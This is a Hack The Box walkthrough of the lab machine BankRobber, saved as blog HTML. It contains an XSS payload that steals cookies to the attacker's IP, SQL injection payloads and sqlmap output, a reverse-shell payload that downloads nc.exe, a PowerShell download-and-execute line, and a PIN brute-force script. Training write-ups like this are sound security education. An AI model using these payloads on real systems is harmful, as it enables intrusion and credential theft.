@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - BankRobber - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-BankRobber"><a href="#Hack-The-Box-BankRobber" class="headerlink" title="Hack The Box - BankRobber"></a>Hack The Box - BankRobber</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Bankrobber is an Insane difficulty Windows machine featuring a web server that is vulnerable to XSS. This is exploited to steal the administrator's cookies, which are used to gain access to the admin panel. The panel is found to contain additional functionality, which can be exploited toread files as well as execute code and gain foothold. An unknown service running on the box isfound to be vulnerable to a buffer overflow, which can be exploited to execute arbitrary commands as SYSTEM. Its IP address is <code>10.10.10.154</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/bankrobber/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services, previously launched a nmap basic scan to all ports, the output was the 80,443,445,3606 open ports:
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/sunday)
+ |                                                                                                                                                                          
+  |
+ |-->{SFire129}#nmap -p 80,443,445,3606 -sC -sV --script vuln 10.10.10.154
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-30 20:58 EDT
+ Nmap scan report for 10.10.10.154
+ Host is up (0.15s latency).
+ 
+ PORT     STATE    SERVICE      VERSION
+ 80/tcp   open     http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ | http-csrf:
+ | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.154
+ |   Found the following possible CSRF vulnerabilities:
+ |
+ |     Path: http://10.10.10.154:80/
+ |     Form id:
+ |     Form action: login.php
+ |
+ |     Path: http://10.10.10.154:80/
+ |     Form id:
+ |     Form action: register.php
+ |
+ |     Path: http://10.10.10.154:80/
+ |     Form id:
+ |_    Form action: #
+ |_http-dombased-xss: Couldn't find any DOM based XSS.
+ | http-enum:
+ |   /admin/: Possible admin folder
+ |   /admin/index.php: Possible admin folder
+ |   /Admin/: Possible admin folder
+ |   /css/: Potentially interesting directory w/ listing on 'apache/2.4.39 (win64) openssl/1.1.1b php/7.3.4'
+ |   /icons/: Potentially interesting folder w/ directory listing
+ |   /img/: Potentially interesting directory w/ listing on 'apache/2.4.39 (win64) openssl/1.1.1b php/7.3.4'
+ |   /js/: Potentially interesting directory w/ listing on 'apache/2.4.39 (win64) openssl/1.1.1b php/7.3.4'
+ |_  /user/: Potentially interesting folder
+ |_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
+ |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+ |_http-trace: TRACE is enabled
+ |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+ | vulners:
+ |   cpe:/a:apache:http_server:2.4.39:
+ |       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
+ |       CVE-2019-10097  6.0     https://vulners.com/cve/CVE-2019-10097
+ |       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
+ |       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
+ |       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
+ |       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081
+ |_      CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
+ 443/tcp  open     ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ |_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
+ | http-csrf:
+ | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.154
+ |   Found the following possible CSRF vulnerabilities:
+ |
+ |     Path: https://10.10.10.154:443/
+ |     Form id:
+ |     Form action: login.php
+ |
+ |     Path: https://10.10.10.154:443/
+ |     Form id:
+ |     Form action: register.php
+ |
+ |     Path: https://10.10.10.154:443/
+ |     Form id:
+ |_    Form action: #
+ |_http-dombased-xss: Couldn't find any DOM based XSS.
+ | http-enum:
+ |   /admin/: Possible admin folder
+ |   /admin/index.php: Possible admin folder
+ |   /Admin/: Possible admin folder
+ |   /css/: Potentially interesting directory w/ listing on 'apache/2.4.39 (win64) openssl/1.1.1b php/7.3.4'
+ |   /icons/: Potentially interesting folder w/ directory listing
+ |   /img/: Potentially interesting directory w/ listing on 'apache/2.4.39 (win64) openssl/1.1.1b php/7.3.4'
+ |   /js/: Potentially interesting directory w/ listing on 'apache/2.4.39 (win64) openssl/1.1.1b php/7.3.4'
+ |_  /user/: Potentially interesting folder
+ |_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
+ | http-slowloris-check:
+ |   VULNERABLE:
+ |   Slowloris DOS attack
+ |     State: LIKELY VULNERABLE
+ |     IDs:  CVE:CVE-2007-6750
+ |       Slowloris tries to keep many connections to the target web server open and hold
+ |       them open as long as possible.  It accomplishes this by opening connections to
+ |       the target web server and sending a partial request. By doing so, it starves
+ |       the http server's resources causing Denial Of Service.
+ |
+ |     Disclosure date: 2009-09-17
+ |     References:
+ |       http://ha.ckers.org/slowloris/
+ |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+ |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+ |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+ | ssl-dh-params:
+ |   VULNERABLE:
+ |   Diffie-Hellman Key Exchange Insufficient Group Strength
+ |     State: VULNERABLE
+ |       Transport Layer Security (TLS) services that use Diffie-Hellman groups
+ |       of insufficient strength, especially those using one of a few commonly
+ |       shared groups, may be susceptible to passive eavesdropping attacks.
+ |     Check results:
+ |       WEAK DH GROUP 1
+ |             Cipher Suite: TLS_DHE_RSA_WITH_AES_256_CBC_SHA
+ |             Modulus Type: Safe prime
+ |             Modulus Source: RFC2409/Oakley Group 2
+ |             Modulus Length: 1024
+ |             Generator Length: 8
+ |             Public Key Length: 1024
+ |     References:
+ |_      https://weakdh.org
+ |_sslv2-drown:
+ | vulners:
+ |   cpe:/a:apache:http_server:2.4.39:
+ |       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
+ |       CVE-2019-10097  6.0     https://vulners.com/cve/CVE-2019-10097
+ |       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
+ |       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
+ |       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
+ |       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081
+ |_      CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
+ 445/tcp  open     microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ 3606/tcp filtered splitlock
+ Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows
+ 
+ Host script results:
+ |_samba-vuln-cve-2012-1182: No accounts left to try
+ |_smb-vuln-ms10-054: false
+ |_smb-vuln-ms10-061: No accounts left to try
+ 
+ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 334.48 seconds </figure></pre>
+  <h2 id="Enumeration"><a href="#Enumeration" class="Enumeration" title="Enumeration"></a>Enumeration</h2>
+ <p>The result show the diferents services running in differents ports.
+ <img src="/images/hackthebox/exploit/bankrobber/1.png" alt=""></p>
+ <p>In the section, register create an user/password for autentication:
+ <img src="/images/hackthebox/exploit/bankrobber/2.png" alt=""></p>
+ <p>Send the transfer for test the app.
+ <img src="/images/hackthebox/exploit/bankrobber/3.png" alt=""></p>
+ <p>Test the web page if has some vulnerability like a XSS with a simple script <code> img src=http://10.10.14.20/diego.jpeg / </code> and running netcat listener.
+ <img src="/images/hackthebox/exploit/bankrobber/4.png" alt=""></p>
+ <p>Inspect the element on web browser, show the password in base64.
+ <img src="/images/hackthebox/exploit/bankrobber/5.png" alt=""></p>
+ <p>Decode the password base64 show the clear text password.
+ <img src="/images/hackthebox/exploit/bankrobber/6.png" alt=""></p>
+ <p>Launch the burpsuite and resende the request.
+ <img src="/images/hackthebox/exploit/bankrobber/7.png" alt=""></p>
+<p>Change the payload to get the cookies administrator user with the next payload <code>img src=x onerror=this.src="http://10.10.14.20/?cookie=" btoa(document.cookie) /></code> and run http simple server with python.
+ <img src="/images/hackthebox/exploit/bankrobber/9.png" alt=""></p>
+ <p>Decode the cookie found on base64
+ 
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox)
+ |                                                                                                                                                                                                                                          
+ |-->{SFire129}#echo -n dXNlcm5hbWU9WVdSdGFXNCUzRDsgcGFzc3dvcmQ9U0c5d1pXeGxjM055YjIxaGJuUnBZdyUzRCUzRDsgaWQ9MQ== | base64 -d                                                                                                                
+ username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D; id=1|-------(root@kali)-------|(~/HackTheBox)
+ |-------(root@kali)-------|(~/HackTheBox/bankrober)
+ |
+ |-->{SFire129}#echo -n YWRtaW4= | base64 -d
+ admin|-------(root@kali)-------|(~/HackTheBox/bankrober)
+ |
+ |-->{SFire129}#echo -n SG9wZWxlc3Nyb21hbnRpYw== | base64 -d
+ Hopelessromantic|-------(root@kali)-------|(~/HackTheBox/bankrober)
+ |
+ |-->{SFire129}#
+ 
+ user: admin
+ pass:Hopelessromantic</figure></pre>
+ <p>Authenticate as a web admin in the web page.
+ <img src="/images/hackthebox/exploit/bankrobber/10.png" alt=""></p>
+ <p>Test with differents attacks, in this case with command dir, show the some privileges for show the output.
+ <img src="/images/hackthebox/exploit/bankrobber/11.png" alt=""></p>
+ <p>Test the injection sql parameters.
+ <img src="/images/hackthebox/exploit/bankrobber/12.png" alt=""></p>
+ <p>Test with the payload <code>-1' union select 1,group_concat(column_name),1 from information_schema.columns where table_schema=database() and table_name='users'-- -</code> show the location file application.
+ <img src="/images/hackthebox/exploit/bankrobber/13.png" alt=""></p>
+ <p>Capture the request authentication with burpsuite, save in file and run with sqlmap.
+ <pre><figure class="highlight plain"> -------(root@kali)-------|(/opt/sqlmap)
+ |                                                                                                                                                                
+ |-->{SFire129}#./sqlmap.py -r ~/HackTheBox/bankrober/search.req --dbs --batch                                                                                    
+         ___
+        __H__                                                                                                                                                     
+  ___ ___[.]_____ ___ ___  {1.4.7.2#dev}                                                                                                                          
+ |_ -| . [']     | .'| . |                                                                                                                                        
+ |___|_  [.]_|_|_|__,|  _|                                                                                                                                        
+       |_|V...       |_|   http://sqlmap.org                                                                                                                      
+ 
+ [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+ 
+ [*] starting @ 18:13:13 /2020-07-02/
+ 
+ [18:13:13] [INFO] parsing HTTP request from '/root/HackTheBox/bankrober/search.req'
+ [18:13:14] [INFO] testing connection to the target URL
+ [18:13:14] [INFO] testing if the target URL content is stable
+ [18:13:14] [INFO] target URL content is stable
+ [18:13:14] [INFO] testing if POST parameter 'term' is dynamic
+ [18:13:15] [INFO] POST parameter 'term' appears to be dynamic
+ [18:13:15] [INFO] heuristic (basic) test shows that POST parameter 'term' might be injectable
+ [18:13:15] [INFO] testing for SQL injection on POST parameter 'term'
+ [18:13:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+ [18:13:18] [INFO] POST parameter 'term' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="admin")
+ [18:13:21] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
+ it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+ for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+ [18:13:21] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+ [18:13:22] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+ [18:13:22] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+ [18:13:22] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+ [18:13:22] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+ [18:13:22] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+ [18:13:22] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+ [18:13:23] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+ [18:13:23] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+ [18:13:23] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+ [18:13:23] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+ [18:13:23] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+ [18:13:24] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+ [18:13:24] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+ [18:13:24] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+ [18:13:24] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+ [18:13:25] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+ [18:13:25] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+ [18:13:25] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
+ [18:13:25] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+ [18:13:25] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
+ [18:13:25] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+ [18:13:25] [INFO] testing 'Generic inline queries'
+ [18:13:25] [INFO] testing 'MySQL inline queries'
+ [18:13:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+ [18:13:34] [INFO] POST parameter 'term' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
+ [18:13:34] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+ [18:13:44] [INFO] POST parameter 'term' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+ [18:13:44] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+ [18:13:44] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+ [18:13:44] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+ [18:13:45] [INFO] target URL appears to have 3 columns in query
+ [18:13:45] [INFO] POST parameter 'term' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+ POST parameter 'term' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+ sqlmap identified the following injection point(s) with a total of 65 HTTP(s) requests:
+ ---
+ Parameter: term (POST)
+     Type: boolean-based blind
+     Title: AND boolean-based blind - WHERE or HAVING clause
+     Payload: term=1' AND 6570=6570 AND 'JtBs'='JtBs
+ 
+     Type: stacked queries
+     Title: MySQL >= 5.0.12 stacked queries (comment)
+     Payload: term=1';SELECT SLEEP(5)#
+ 
+     Type: time-based blind
+     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+     Payload: term=1' AND (SELECT 3680 FROM (SELECT(SLEEP(5)))hgOI) AND 'GufK'='GufK
+ 
+     Type: UNION query
+     Title: Generic UNION query (NULL) - 3 columns
+     Payload: term=1' UNION ALL SELECT NULL,CONCAT(0x7162767671,0x4a554d41596a614d4153656f55686b715a4a57756f6d4943474f4369714d56707a47576c57624f42,0x716b627a71),NULL-- -
+ ---
+ [18:13:45] [INFO] the back-end DBMS is MySQL
+ web application technology: PHP 7.3.4, Apache 2.4.39
+ back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+ [18:13:46] [INFO] fetching database names
+ available databases [6]:
+ [*] bankrobber
+ [*] information_schema
+ [*] mysql
+ [*] performance_schema
+ [*] phpmyadmin
+ [*] test
+ 
+ [18:13:46] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.154'
+ 
+ [*] ending @ 18:13:46 /2020-07-02/   </figure></pre>
+ <p>The output sqlmap show the users and passwords.
+  <img src="/images/hackthebox/exploit/bankrobber/15.png" alt=""></p>
+  <p>Create a file backdoor.js with the next code inside for test ping from the target. 
+  <pre><figure class="highlight plain"> var xhr = new XMLHttpRequest();
+var url = "http://localhost/admin/backdoorchecker.php";
+var params = "cmd=dir | ping -n 1 10.10.14.20";
+xhr.open("POST", URL);
+xhr.setRequestHeader('Content-Type', 'Application/x-www-form-urlencoded');
+xhr.withCredentials = true;
+xhr.send(params);
+</figure></pre>
+<p>Run the script <code> script src=http://10.10.14.20/backdoor.js>/script></code> from burpsuite. In the Kali linux run the <code>tcpdump -i tun0 icmp</code> for view information about the payload.
+ <img src="/images/hackthebox/exploit/bankrobber/16.png" alt=""></p>
+  <h2 id="Exploit"><a href="#Exploit" class="Exploit" title="Exploit"></a>Exploit</h2>
+ <p>Change the script for run reverse connection:
+<pre><figure class="highlight plain"> var request = new XMLHttpRequest();
+var params = 'cmd=dir|powershell -c "iwr -uri 10.10.14.20/nc.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe 10.10.14.20 9001';
+request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
+request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+request.send(params);</figure></pre>
+<p>Run the simple http server with the backdoor.js and nc.exe files, run a netcat listening conection over port 9001:
+ <img src="/images/hackthebox/exploit/bankrobber/17.png" alt=""></p>
+ <p>In Kali Linux create a server smb
+ <pre><figure class="highlight plain">|-------(root@kali)-------|(~/HackTheBox/Bankrobber/www)
+|
+|-->{SFire129}#impacket-smbserver www $(pwd) -smb2support
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed</figure></pre>
+<p>Connect from reverse connection netcat to smb server kali. <code>New-PSDrive -name www -PSProvider "FileSystem" -Root "\\10.10.14.20\www"</code>
+ <img src="/images/hackthebox/exploit/bankrobber/18.png" alt=""></p>
+ <p>The target was connected to a share folder on Kali Linux.
+ <img src="/images/hackthebox/exploit/bankrobber/19.png" alt=""></p>
+ <p>Review and enumerate the system; show that not has hotfixes.
+ <img src="/images/hackthebox/exploit/bankrobber/20.png" alt=""></p>
+ <p>With Shrlock.ps1 script and winPEAS.exe, running the same simple http server kali, <code>echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.20/Sherlock.ps1') | powershell -noprofile -</code> but no has knowns vulnerabilities.
+ <img src="/images/hackthebox/exploit/bankrobber/21.png" alt=""></p>
+   <h2 id="Get_privileges"><a href="#Get_privileges" class="Get_privileges" title="Get_privileges"></a>Get_privileges</h2>
+ <p>With the netstat command, show the port 910 for localhost connection.
+ <img src="/images/hackthebox/exploit/bankrobber/22.png" alt=""></p>
+ <p>The process list show the service about bankrobber.
+ <img src="/images/hackthebox/exploit/bankrobber/23.png" alt=""></p>
+ <p>Download <code>chisel</code> program for linux and windows, put both in the www share folder. https://github.com/jpillora/chisel/releases
+ <img src="/images/hackthebox/exploit/bankrobber/24.png" alt=""></p>
+<p> Run the chisel server for reverse connection over port 9002. 
+ <img src="/images/hackthebox/exploit/bankrobber/25.png" alt=""></p>
+ <p>In the target, run the chisel for generate reverse connection tunnel over port 910. <code>./chisel.exe client 10.10.14.20:9002 R:910:127.0.0.1:910</code>
+ <img src="/images/hackthebox/exploit/bankrobber/27.png" alt=""></p>
+ <p>Test the connection over localhost port 910:
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/bankrober/www)
+|                                                                                                                                                                                                                                          
+|-->{SFire129}#telnet localhost 910                                                                                                                                                                                                        
+Trying ::1...
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+ --------------------------------------------------------------
+ Internet E-Coin Transfer System
+ International Bank of Sun church
+                                        v0.1 by Gio & Cneeliz
+ --------------------------------------------------------------
+ Please enter your super secret 4 digit PIN code to login:
+ [$]  </figure></pre>
+ <P>We need to create a script for brute force over port 910 for 4 digits pin:
+  <pre><figure class="highlight plain">from pwn import *
+for i in range(0,9999):
+        pin = str(i)
+        code = pin.zfill(4)
+        r = remote("localhost", 910)
+        r.recvuntil("[$] ")
+        r.sendline(code)
+        response = r.recvline()
+        r.close()
+        if b"Access denied" not in response:
+                print(code)
+                break
+ </figure></pre>
+ <p>Run the script, it's works!!
+ <img src="/images/hackthebox/exploit/bankrobber/28.png" alt=""></p>
+ <p>Run against, finally show the password:
+ <img src="/images/hackthebox/exploit/bankrobber/29.png" alt=""></p>
+ <p>In the reverse connection netcat, autenticate over service 910 and run reverse conection shell over port 9004
+  <img src="/images/hackthebox/exploit/bankrobber/32.png" alt=""></p>
+  <p>We have a reverse connection over port 9004 as administrator.
+ <img src="/images/hackthebox/exploit/bankrobber/30.png" alt=""></p>
+  <h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="Capture-The-Flag" title="Capture-The-Flag"></a>Capture The Flag</h2>
+ <img src="/images/hackthebox/exploit/bankrobber/31.png" alt=""></p>
+ 
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
